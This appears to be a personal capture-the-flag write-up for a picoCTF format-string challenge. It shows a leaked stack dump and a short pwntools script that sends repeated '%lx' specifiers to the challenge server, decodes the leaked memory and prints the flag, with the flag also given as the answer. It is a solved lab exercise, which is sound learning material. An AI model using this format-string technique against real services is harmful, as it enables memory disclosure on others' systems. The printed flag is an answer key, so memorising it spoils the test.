---
ai_date: '2025-04-27 05:29:15'
ai_summary: Flag found in memory using `%lx` format string
ai_tags:
- fmt-str
- rop
- xss
created: 2024-08-08T01:57
updated: 2024-08-08T02:30
---

The flag itself is also in memory, in that case we can just spam `%x`

```python
[b'\x18!@\x00', b'\x00\x00\x00\x00', b'\x00J\x8c\x8b', b'\x00\x00\x00\x00', b'\x80h\x05\x01', b'4x4\n', b'\xe0\x14k\x9a', b'`^k\x8b', b'\xd0\xa4\x8d\x8b', b'\x01\x00\x00\x00', b'\xb0\x15k\x9a', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'pico', b'4n1m', b'7y13', b'_f14', b'67bc', b'\x07\x00\x00\x00', b'\xd8\xc8\x8d\x8b', b'\x07\x00\x00\x00', b'Pr0t', b'Styl', b'\t\x00\x00\x00', b'\xe9\xdd\x8e\x8b', b'\x98\xe0k\x8b', b'\xd0\xa4\x8d\x8b', b'\x00\x00\x00\x00', b'\xc0\x15k\x9a', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'%x-%', b'-%x-', b'x-%x', b'\x00HOS', b'E=ch', b'nge\x00', b'L=1\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', b'\x00\x00\x00\x00']
```

There it is, but truncated, well we can use `%lx`.

```python
from pwn import *
context.log_level = 'error'
# nc mimas.picoctf.net 52015
r = remote('mimas.picoctf.net', 52015)
r.sendlineafter(b':\n', b'%lx-'*20)
r.recvuntil(b'order: ')
l = [bytes.fromhex(i.rjust(16, '0'))[::-1] for i in r.recvline().decode().strip().split("-")]
print(b''.join(l))
r.close()
b'\x18!@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xca:r\x12}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80xS\x01\x00\x00\x00\x004x4\n\x00\x00\x00\x00@\x0ci~\xfe\x7f\x00\x00`\xde\x19r\x12}\x00\x00\xd0$<r\x12}\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x10\ri~\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00\x07\x00\x00\x00\x00\x00\x00\x00\xd8H<r\x12}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

```flag
picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}
```